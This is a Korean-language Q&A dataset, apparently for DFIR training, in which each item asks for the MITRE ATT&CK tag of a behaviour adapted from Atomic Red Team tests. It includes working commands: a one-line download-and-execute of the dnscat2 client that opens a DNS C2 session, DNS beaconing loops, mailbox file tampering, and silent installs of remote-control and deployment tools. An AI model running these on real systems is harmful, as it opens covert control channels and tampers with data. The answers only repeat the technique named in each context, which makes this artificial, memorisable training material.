{"id": "T1070.008_edddff85-fee0-499d-9501-7d4d2892e79b_Q2", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1070.008 Email Collection: Mailbox Manipulation (Tactic: Collection / Defense Evasion)\n[요약] Windows 메일 저장소 데이터를 copy 폴더로 복사한 뒤, 복사된 각 파일에 문자열을 추가해 메일박스 내용을 조작·오염시키는 시나리오를 재현한다.\n[절차] 1) 관리자 권한 PowerShell을 실행한다. 2) 다음 명령으로 Unistore 메일 데이터 폴더 하위에 copy 폴더를 생성하고, 원본 파일을 모두 복사한다.    - New-Item 으로 copy 폴더 생성.    - Get-ChildItem 으로 data 경로의 모든 항목을 나열하되 copy 폴더는 제외.    - Copy-Item -Recurse 로 copy 폴더에 전체 복제. 3) 복사된 파일들에 대해 Add-Content를 이용해 특정 문자열을 덧붙인다.    - Get-ChildItem -File 로 copy 폴더 내 파일 목록을 가져온 뒤, 각 파일에      `\"Modification for Atomic Red Test\"` 문자열을 추가한다. 4) 공격자 관점:    - 이메일 원문 또는 인덱스 파일을 조작해 일부 메시지를 손상시키거나, 인덱스 불일치를 의도적으로 유발해 사용자가 정상적으로 메일을 열지 못하게 할 수 있다.    - 또는 포렌식 시 분석가가 '오염된' 사본만 보게 만들어 실제 원본과 다른 내용을 보게 할 수도 있다. 5) 방어/포렌식 관점:    - 메일 데이터 디렉터리 내 대량 파일 복사 후, 짧은 시간 내 수십~수백 개 파일의 크기 증가/내용 변경이 감지되면 조작 가능성을 의심할 수 있다.    - 백업/저널링 메일 서버와 비교해 로컬 저장소의 변조 여부를 검증하는 절차를 설계할 수 있다. 6) 테스트 후에는 Atomic의 cleanup 명령으로 copy 폴더를 제거해 환경을 원복할 수 있다.\n[대표 명령 예시]\nNew-Item -Path \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy\" -ItemType Directory -ErrorAction Ignore\r\nGet-ChildItem -Path \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\" -Exclude copy | ForEach-Object { Copy-Item -Path $_.FullName -Destination \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy\" -Recurse -Force -ErrorAction Ignore }\r\nGet-ChildItem -Path \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy\" -File | ForEach-Object { Add-Content -Path $_.FullName -Value \"Modification for Atomic Red Test\" -ErrorAction Ignore }", "answer": "이 행위는 MITRE ATT&CK의 T1070.008 \"Email Collection: Mailbox Manipulation\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Collection / Defense Evasion이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1071_3b0df731-030c-4768-b492-2a3216d90e53_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1071 Application Layer Protocol (Tactic: Command and Control)\n[요약] Windows 클라이언트에서 telnet_client.exe를 이용해 지정된 IP/포트의 Telnet C2 서버와 세션을 맺어 C2 통신을 모사한다.\n[절차] 1) C2 서버 준비    - 별도의 서버(또는 동일 호스트의 다른 세션)에서 Telnet C2 서버 프로그램 `telnet_server.exe`를 실행한다.    - 서버는 지정한 IP(또는 호스트명)와 포트(기본값 23)에서 클라이언트 연결을 수신할 수 있어야 한다.  2) 클라이언트 측 연결 전 네트워크 확인    - Windows 클라이언트에서 PowerShell을 관리자 혹은 일반 사용자 권한으로 실행한다.    - 아래와 같이 C2 서버에 대한 TCP 연결 가능 여부를 사전에 확인할 수 있다.      `Test-NetConnection -ComputerName <server_ip> -Port <server_port>`    - `TcpTestSucceeded : True` 이면 연결 가능, False이면 방화벽/라우팅/서버 미기동 등의 문제를 의미한다.  3) Telnet C2 클라이언트 실행    - Atomic 정의의 main 실행 명령은 다음과 같다.      `#{client_path} #{server_ip} --port #{server_port}`    - 예시:      `PathToAtomicsFolder\\T1071\\bin\\telnet_client.exe 192.168.0.10 --port 23`    - 이 명령 실행 시 클라이언트는 지정된 IP와 포트로 Telnet 세션을 수립하려 시도한다.  4) C2 동작 관찰    - 서버 측 콘솔(또는 로그)에서 클라이언트 접속 이벤트를 확인할 수 있다.    - 일부 PoC C2 구현체는 접속 후 단순 쉘 명령 수행, banner 출력, ping/pong keep-alive 등 기본적인 상호작용을 제공한다.    - 네트워크 관점에서는 23/TCP(또는 설정한 포트)로의 세션 생성, 지속적인 양방향 데이터 교환 패턴이 관찰된다.  5) 탐지/포렌식 관점 정리    - 비정상적인 Telnet(23/TCP) 아웃바운드 세션이 발생하는지 FW/Proxy/IDS에서 모니터링할 수 있다.    - 엔드포인트에서 `telnet_client.exe`와 같은 의심스러운 이진 실행, 그리고 특정 외부 IP로의 지속적인 TCP 세션 패턴을 탐지 룰로 정의할 수 있다.    - Windows 방화벽 로그, Sysmon(NetworkConnect 이벤트), 프록시 로그, 패킷 캡처(TCP 스트림) 등을 통해 C2 패턴(주기적 명령 요청/응답)을 분석할 수 있다.  6) 테스트 종료 및 정리    - 클라이언트에서 telnet_client 프로세스를 종료한다.    - 서버 측 telnet_server 프로세스도 종료하여 포트를 해제한다.    - 필요 시, 실험용 바이너리 및 설정 파일을 삭제하거나 격리된 디렉터리에 보관한다.\n[대표 명령 예시]\n#{client_path} #{server_ip} --port #{server_port}", "answer": "이 행위는 MITRE ATT&CK의 T1071 \"Application Layer Protocol\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Command and Control이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1071.004_1700f5d6-5a44-487b-84de-bc66f507b0a6_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1071.004 Application Layer Protocol: DNS (Tactic: Command and Control)\n[요약] 단일 호스트에서 대량의 DNS 쿼리를 전송해, ‘쿼리 건수 기반’ 탐지(Threshold 기반) 룰이 제대로 동작하는지 확인하는 시뮬레이션.\n[절차] 1) 파라미터 설정    - query_type: 기본값 TXT (DNS 터널링에서 자주 쓰는 타입)    - subdomain: 예) atomicredteam    - query_volume: 기본 1000 (0~1000까지 쿼리 총 1001회)    - domain: 예) 127.0.0.1.nip.io  2) PowerShell에서 아래 명령 실행    `for($i=0; $i -le #{query_volume}; $i++) {         Resolve-DnsName -type \"#{query_type}\" \"#{subdomain}-$(Get-Random -Minimum 1 -Maximum 999999).#{domain}\" -QuickTimeout     }`  3) 동작 방식    - 매 쿼리마다 랜덤 숫자를 붙인 서브도메인(atomicredteam-123456.example.com 형태)을 생성.    - 각각에 대해 TXT 타입 DNS 조회를 수행.    - 결과적으로, 짧은 시간에 매우 많은 ‘서로 다른 FQDN’ 쿼리가 발생함.  4) 포렌식/탐지 포인트    - 단일 클라이언트 → 특정 도메인으로의 비정상적으로 높은 DNS 쿼리 횟수.    - label 패턴이 `고정 prefix + 랜덤 문자열` 형태로 반복되는 도메인.    - TXT 쿼리 비율이 비정상적으로 높은 호스트/프로세스.    - DNS 로그(Windows DNS Server, 내부 DNS, 보안 DNS, DoH Proxy 등)에서 같은 특징을 가진 패턴을 룰로 잡을 수 있음.  5) 테스트 종료 후    - 별도의 cleanup 명령은 없음 (DNS 쿼리는 흔적만 남고 리소스는 없음).    - 대신 DNS 서버 로그, FW/IDS 로그 등을 수집하여 쿼리 빈도·패턴 기반 탐지 룰을 검증하면 됨.\n[대표 명령 예시]\nfor($i=0; $i -le #{query_volume}; $i++) { Resolve-DnsName -type \"#{query_type}\" \"#{subdomain}-$(Get-Random -Minimum 1 -Maximum 999999).#{domain}\" -QuickTimeout }", "answer": "이 행위는 MITRE ATT&CK의 T1071.004 \"Application Layer Protocol: DNS\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Command and Control이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1071.004_3efc144e-1af8-46bb-8ca2-1376bb6db8b6_Q2", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1071.004 Application Layer Protocol: DNS (Tactic: Command and Control)\n[요약] 지속적으로 일정(또는 약간 변형된) 간격으로 DNS 쿼리를 보내는 C2 비콘 패턴을 시뮬레이션. ‘저빈도 장기형 C2’ 탐지 실험용.\n[절차] 1) 파라미터 의미    - runtime: 전체 시뮬레이션 시간(분 단위, 기본 30분).    - domain: C2 도메인 (예: 127.0.0.1.nip.io).    - subdomain: 기본 atomicredteam.    - query_type: 기본 TXT.    - c2_interval: 기본 30초 간격.    - c2_jitter: 기본 20% (±20% 랜덤 지터로 간격 변동).  2) PowerShell에서 작업 디렉토리 변경    `Set-Location \"PathToAtomicsFolder\"`  3) 비콘 스크립트 실행    `./T1071.004/src/T1071-dns-beacon.ps1 \\       -Domain #{domain} -Subdomain #{subdomain} \\       -QueryType #{query_type} -C2Interval #{c2_interval} \\       -C2Jitter #{c2_jitter} -RunTime #{runtime}`  4) 동작 방식    - runtime 동안 일정 주기로 DNS 쿼리를 전송.    - C2Interval ± Jitter를 적용해, 완전히 고정된 주기가 아닌 ‘살짝 흔들리는’ 주기 패턴을 만든다.    - 실제 공격에서 흔한 ‘주기적 beaconing + 약간의 랜덤성’ 행태를 재현.  5) 포렌식/탐지 포인트    - 단일 호스트(또는 프로세스)에서 특정 도메인으로 일정/유사한 간격의 DNS 쿼리 시퀀스.    - N분 동안 일정 횟수 이상, 간격 표준편차가 작은 패턴.    - 쿼리 타입(TXT), 도메인 레이블 구조, 질의 실패/성공 비율 등과 결합하여 C2 의심 세션을 스코어링.  6) 종료    - runtime이 지나면 스크립트가 자동 종료.    - 필요 시 PowerShell 프로세스를 수동으로 종료할 수 있음.\n[대표 명령 예시]\nSet-Location \"PathToAtomicsFolder\"; .\\T1071.004\\src\\T1071-dns-beacon.ps1 -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type} -C2Interval #{c2_interval} -C2Jitter #{c2_jitter} -RunTime #{runtime}", "answer": "이 행위는 MITRE ATT&CK의 T1071.004 \"Application Layer Protocol: DNS\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Command and Control이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1071.004_fef31710-223a-40ee-8462-a396d6b66978_Q3", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1071.004 Application Layer Protocol: DNS (Tactic: Command and Control)\n[요약] 도메인 이름 길이를 점점 늘려가며 DNS 쿼리를 보내, ‘비정상적으로 긴 도메인 이름’ 기반 탐지 룰을 검증하는 시뮬레이션.\n[절차] 1) 파라미터    - query_type: TXT (기본값).    - subdomain: 63자짜리 고정 문자열(atomicredteamatomicredteamatomicredteamatomicredteamatomicredte).    - domain: 예) 127.0.0.1.nip.io.  2) PowerShell에서 작업 경로 변경    `Set-Location \"PathToAtomicsFolder\"`  3) 길이 증가 테스트 실행    `./T1071.004/src/T1071-dns-domain-length.ps1 -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type}`  4) 동작 방식    - 스크립트는 지정된 서브도메인/도메인을 기반으로 도메인 전체 길이를 단계별로 늘려가며 DNS 쿼리를 전송.    - 최종적으로 RFC에서 허용하는 ‘FQDN 최대 길이’(보통 253자 내외)에 근접한 도메선까지 쿼리를 시도.  5) 포렌식/탐지 포인트    - 비정상적으로 긴 도메인 또는 라벨(특히 base32/base64 패턴처럼 보이는 문자열)의 반복.    - DNS 로그에서 request length, label length 분포를 기반으로 outlier 탐지.    - DNS 터널링·DGA 기반 악성 행위에서 자주 나타나는 특징이므로, ‘도메인 길이 + 쿼리 타입 + 도메인 패턴’을 조합한 룰 설계에 활용 가능.\n[대표 명령 예시]\nSet-Location \"PathToAtomicsFolder\"; .\\T1071.004\\src\\T1071-dns-domain-length.ps1 -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type}", "answer": "이 행위는 MITRE ATT&CK의 T1071.004 \"Application Layer Protocol: DNS\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Command and Control이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1071.004_e7bf9802-2e78-4db9-93b5-181b7bcd37d7_Q4", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1071.004 Application Layer Protocol: DNS (Tactic: Command and Control)\n[요약] dnscat2 기반 DNS C2 세션을 실제로 만들어보는 테스트. 도메인/서버 IP를 미리 구성해 둔 상태에서 PowerShell 버전 dnscat2 클라이언트를 실행한다.\n[절차] 1) 파라미터 설정    - domain: dnscat2 C2용으로 설정한 도메인 (예: c2.example.com).    - server_ip: dnscat2 DNS 서버 IP (예: 10.0.0.10).  2) PowerShell에서 dnscat2 클라이언트 스크립트 로드    `IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1')`    - 원격 GitHub에서 PowerShell 버전 dnscat2 함수를 다운로드 후, 현재 세션에 로드.  3) DNS C2 세션 시작    `Start-Dnscat2 -Domain #{domain} -DNSServer #{server_ip}`    - 클라이언트는 지정된 DNS 서버로 쿼리를 전송하며, dnscat2 프로토콜로 C2 세션을 수립.    - 서버 측 dnscat2 콘솔에서 새로운 세션이 생성되고, 명령 실행·파일 전송 등 기능을 사용할 수 있음.  4) 포렌식/탐지 포인트    - 특정 도메인으로 지속적인 TXT/NULL/특정 타입 쿼리가 발생.    - 전형적인 DNS 터널링 패턴:      · 서브도메인 부분에 base32/base64와 유사한 엔코딩 문자열 반복.      · 짧은 간격의 다수 TXT 쿼리.    - 엔드포인트 측에서 PowerShell의 원격 스크립트 다운로드 + 의심 함수명(Start-Dnscat2 등) 호출 로그.    - DNS 서버/보안 솔루션에서 dnscat2 시그니처 또는 트래픽 패턴 탐지.  5) 종료    - 서버 콘솔에서 세션 종료 명령 수행 또는 클라이언트에서 PowerShell 세션 종료.    - 테스트 후, 관련 스크립트/파일 및 DNS 레코드(NS 설정)를 원 상태로 복구.\n[대표 명령 예시]\nIEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1'); Start-Dnscat2 -Domain #{domain} -DNSServer #{server_ip}", "answer": "이 행위는 MITRE ATT&CK의 T1071.004 \"Application Layer Protocol: DNS\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Command and Control이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1072_b4988cad-6ed2-434d-ace5-ea2670782129_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1072 Software Deployment Tools (Tactic: Lateral Movement)\n[요약] Radmin Viewer(원격 제어 도구)를 설치하고 콘솔을 실행한다. 공격자가 합법적인 원격 관리 도구를 C2/원격 제어 채널로 악용하는 상황을 모사한다.\n[절차] 1) Radmin 설치 여부 확인 (PowerShell, prereq_command)    - `${env:ProgramFiles(x86)}/Radmin Viewer 3/Radmin.exe` 경로에 실행 파일 존재 여부 확인.    - 존재하면 바로 테스트 실행 가능, 없으면 설치 단계로 이동.  2) Radmin 설치 (get_prereq_command)    - 작업용 폴더 생성: `PathToAtomicsFolder\\..\\ExternalPayloads\\`    - Radmin Viewer MSI 다운로드:        `Invoke-WebRequest \"https://www.radmin.com/download/Radmin_Viewer_3.5.2.1_EN.msi\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\RadminViewer.msi\"`    - MSI를 무인설치(/qn)로 실행:        `Start-Process msiexec -Wait -ArgumentList /i , \"PathToAtomicsFolder\\..\\ExternalPayloads\\RadminViewer.msi\", /qn`  3) Radmin 콘솔 실행 (executor)    - 명령 프롬프트에서:        `\"%PROGRAMFILES(x86)%/Radmin Viewer 3/Radmin.exe\"`    - 실행 시 Radmin Viewer GUI가 뜨며, 원격 호스트 추가/접속 메뉴를 통한 원격 제어가 가능.  4) 포렌식/탐지 포인트    - 신규 Radmin 설치 흔적: MSI 설치 로그, Program Files(x86) 내 Radmin 폴더 생성.    - 비업무 시간대 또는 비인가 단말에서의 Radmin 실행.    - Radmin 프로세스(radmin.exe)와 외부로의 RDP/전용 포트 통신(포트 4899 등) 발생 여부.    - ‘Radmin Viewer 3’가 기존 자산 관리 리스트에 없는데 갑자기 등장하는 경우.\n[대표 명령 예시]\nif (Test-Path \"${env:ProgramFiles(x86)}/Radmin Viewer 3/Radmin.exe\") {exit 0} else {exit 1}\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null; Invoke-WebRequest \"https://www.radmin.com/download/Radmin_Viewer_3.5.2.1_EN.msi\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\RadminViewer.msi\"; Start-Process msiexec -Wait -ArgumentList /i , \"PathToAtomicsFolder\\..\\ExternalPayloads\\RadminViewer.msi\", /qn", "answer": "이 행위는 MITRE ATT&CK의 T1072 \"Software Deployment Tools\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Lateral Movement이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1072_e447b83b-a698-4feb-bed1-a7aaf45c3443_Q2", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1072 Software Deployment Tools (Tactic: Lateral Movement)\n[요약] PDQ Deploy(소프트웨어 일괄 배포 도구)를 설치하고 콘솔을 실행한다. 공격자가 PDQ를 악용해 여러 호스트에 원격 관리 도구(RAT)를 배포하는 초기 단계를 재현.\n[절차] 1) PDQ Deploy 설치 여부 확인 (prereq_command)    - `${env:ProgramFiles(x86)}/Admin Arsenal/PDQ Deploy/PDQDeployConsole.exe` 존재 확인.    - 없으면 설치 단계 수행.  2) PDQ Deploy 설치 (get_prereq_command)    - ExternalPayloads 폴더 생성:        `New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force`    - 설치 파일 다운로드:        `Invoke-WebRequest \"https://download.pdq.com/release/19/Deploy_19.3.350.0.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\PDQDeploysetup.exe\"`    - 무인 설치 실행:        `Start-Process \"PathToAtomicsFolder\\..\\ExternalPayloads\\PDQDeploysetup.exe\" -Wait -ArgumentList \"/s\"`  3) PDQ 콘솔 실행 (executor)    - 명령 프롬프트에서:        `\"%PROGRAMFILES(x86)%/Admin Arsenal/PDQ Deploy/PDQDeployConsole.exe\"`    - 콘솔이 뜨면, 패키지 생성 → 배포 대상(AD, IP 범위 등) 설정 → SW 또는 스크립트(예: RAT)를 여러 호스트에 한 번에 푸시 가능.  4) 포렌식/탐지 포인트    - PDQ Deploy 신규 설치 흔적 (프로그램 경로, 서비스, 레지스트리).    - 콘솔 실행 계정이 일반 사용자/비인가 계정인지 여부.    - PDQ가 단기간에 대량의 SMB/WMI/WinRM 연결을 생성하며 EXE·스크립트를 푸시하는 패턴.    - 배포된 패키지 내용에 비정상적인 EXE, PowerShell 스크립트, RAT 도구가 포함되어 있는지.\n[대표 명령 예시]\nif (Test-Path \"${env:ProgramFiles(x86)}/Admin Arsenal/PDQ Deploy/PDQDeployConsole.exe\") {exit 0} else {exit 1}\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null; Invoke-WebRequest \"https://download.pdq.com/release/19/Deploy_19.3.350.0.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\PDQDeploysetup.exe\"; Start-Process \"PathToAtomicsFolder\\..\\ExternalPayloads\\PDQDeploysetup.exe\" -Wait -ArgumentList \"/s\"", "answer": "이 행위는 MITRE ATT&CK의 T1072 \"Software Deployment Tools\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Lateral Movement이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1072_2169e8b0-2ee7-44cb-8a6e-d816a5db7d8a_Q3", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1072 Software Deployment Tools (Tactic: Lateral Movement)\n[요약] 패키지 매니저 Chocolatey를 이용해 7-Zip을 설치한다. 실제 공격에서는 이를 악용해 7-Zip 대신 악성 도구를 다수 시스템에 일괄 배포할 수 있다.\n[절차] 1) Chocolatey 설치 여부 확인 (prereq_command)    - `${env:ProgramFiles(x86)}\\Chocolatey\\choco.exe` 경로 체크.    - 없으면 설치 단계 수행.  2) Chocolatey 설치 (get_prereq_command)    - 설치 스크립트 다운로드:        `Invoke-WebRequest -Uri \"https://chocolatey.org/install.ps1\" -OutFile \"chocolatey-install.ps1\"`    - Bypass 정책으로 PowerShell 스크립트 실행:        `Start-Process -FilePath \"powershell.exe\" -ArgumentList \"-NoProfile -ExecutionPolicy Bypass -File chocolatey-install.ps1\" -Wait`  3) 7-Zip 배포 (executor)    - PowerShell에서:        `choco install -y 7zip`    - 이 과정이 실제로는 네트워크 상의 여러 노드에서 동시에 수행될 수 있으며, 공격자는 이 메커니즘을 활용해 악성 패키지를 설치할 수 있음.  4) 포렌식/탐지 포인트    - Chocolatey 설치 흔적 (폴더, 레지스트리, PATH 변경).    - choco 명령 호출 로그 (PowerShell 로그, Sysmon 이벤트 등).    - choco를 통해 설치되는 패키지가 표준 SW인지, 내부에서 승인된 리스트인지 여부.    - 단기간에 여러 서버/클라이언트에서 동일한 choco 명령이 반복되는 경우 (배포형 악용).\n[대표 명령 예시]\nif (Test-Path \"${env:ProgramFiles(x86)}\\Chocolatey\\choco.exe\") {exit 0} else {exit 1}\nInvoke-WebRequest -Uri \"https://chocolatey.org/install.ps1\" -OutFile \"chocolatey-install.ps1\"; Start-Process -FilePath \"powershell.exe\" -ArgumentList \"-NoProfile -ExecutionPolicy Bypass -File chocolatey-install.ps1\" -Wait", "answer": "이 행위는 MITRE ATT&CK의 T1072 \"Software Deployment Tools\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Lateral Movement이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1074.001_107706a5-6f9f-451a-adae-bab8c667829f_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1074.001 Data Staged: Local Data Staging (Tactic: Collection)\n[요약] PowerShell Invoke-WebRequest로 원격 GitHub에서 discovery.bat를 다운로드하여 %TEMP% 경로에 저장한다. 이는 공격자가 정보 수집용 배치 스크립트를 먼저 호스트에 내려받아 스테이징하는 행위를 모사한다.\n[절차] 1) 스테이징 대상 경로 결정    - 기본값: `$env:TEMP\\discovery.bat`    - 필요 시 다른 임시 폴더나 사용자 지정 경로로 변경 가능.  2) PowerShell을 통해 도구 다운로드 (실제 공격 모사)    - GitHub Atomic Red Team 리포지터리에서 Discovery.bat를 가져와 로컬에 저장:        `Invoke-WebRequest \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.bat\" -OutFile $env:TEMP\\discovery.bat`  3) 스테이징 결과 확인    - 파일 존재 여부:        `Test-Path $env:TEMP\\discovery.bat`    - 탐지 관점에서는 ‘임시 폴더에 새 배치 파일 생성’ + ‘외부 GitHub 도메인에서 단일 스크립트 다운로드’ 패턴을 함께 보는 것이 중요.  4) 포렌식/탐지 포인트    - PowerShell Operational 로그(4688/4104 등)에서 Invoke-WebRequest → 외부 도메인 호출 흔적.    - %TEMP% 경로에 새롭게 생성된 .bat 파일(특히 이름이 generic한 discovery, collect, info 같은 경우).    - 동일 호스트에서 다른 정찰/수집 스크립트와 함께 반복적으로 다운로드되는 패턴.    - EDR/AV에서 ‘스크립트 다운로드 후 즉시 실행’ 체인을 T1074.001 + T1059 (Command/Scripting Interpreter) 조합으로 태깅 가능.\n[대표 명령 예시]\nInvoke-WebRequest \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.bat\" -OutFile $env:TEMP\\discovery.bat\nRemove-Item -Force $env:TEMP\\discovery.bat -ErrorAction Ignore", "answer": "이 행위는 MITRE ATT&CK의 T1074.001 \"Data Staged: Local Data Staging\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Collection이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1074.001_a57fbe4b-3440-452a-88a7-943531ac872a_Q2", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1074.001 Data Staged: Local Data Staging (Tactic: Collection)\n[요약] PowerShell Compress-Archive를 사용하여 특정 폴더(또는 파일 집합)를 ZIP 파일로 압축하고 %TEMP%에 저장한다. 이는 공격자가 유출 전 데이터를 한 번에 보내기 위해 로컬에서 압축·정리하는 전형적인 스테이징 패턴이다.\n[절차] 1) 입력/출력 경로 정의    - 입력(스테이징 대상): `PathToAtomicsFolder\\T1074.001\\bin\\Folder_to_zip`    - 출력(스테이징 ZIP 파일): `$env:TEMP\\Folder_to_zip.zip`  2) 테스트용 폴더 준비 (선택적으로 선행)    - 실제 환경에서는 공격자가 사용자 문서 폴더, 브라우저 프로파일, DB 파일 등을 타겟으로 선택.    - Atomic 환경에서는 미리 준비된 샘플 폴더를 사용.  3) PowerShell로 ZIP 압축 수행    - 명령 예:        `Compress-Archive -Path \"PathToAtomicsFolder\\T1074.001\\bin\\Folder_to_zip\" -DestinationPath $env:TEMP\\Folder_to_zip.zip -Force`    - `-Force` 옵션으로 기존 ZIP 파일이 있더라도 덮어씀.  4) 스테이징 결과 확인    - `%TEMP%` 경로에 `Folder_to_zip.zip` 생성 여부 확인:        `Test-Path $env:TEMP\\Folder_to_zip.zip`    - 포렌식 관점에서, 단기간에 대용량 ZIP이 생성되고 곧이어 네트워크 전송 이벤트(HTTP POST, FTP, 클라우드 동기화 등)가 발생하면 T1074.001 → T1041(Exfil over C2) 또는 T1567(Exfil to Cloud) 체인으로 의심 가능.  5) 포렌식/탐지 포인트    - Compress-Archive 호출 로그(PowerShell 4104, ScriptBlockLogging).    - 평소 사용되지 않던 계정/서버에서 갑자기 Temp 경로에 대용량 ZIP 생성.    - 동일 이름의 ZIP이 주기적으로 갱신되는 패턴 (스케줄 기반 수집 후 유출).    - ZIP 내부에 민감 확장자(.docx, .pdf, .xlsx, .pst, .wallet 등)가 다량 포함된 경우.  6) 정리(Cleanup)    - 테스트 종료 후에는 `Folder_to_zip.zip` 삭제:        `Remove-Item -Path $env:TEMP\\Folder_to_zip.zip -ErrorAction Ignore`\n[대표 명령 예시]\nCompress-Archive -Path \"PathToAtomicsFolder\\T1074.001\\bin\\Folder_to_zip\" -DestinationPath $env:TEMP\\Folder_to_zip.zip -Force\nRemove-Item -Path $env:TEMP\\Folder_to_zip.zip -ErrorAction Ignore", "answer": "이 행위는 MITRE ATT&CK의 T1074.001 \"Data Staged: Local Data Staging\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Collection이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
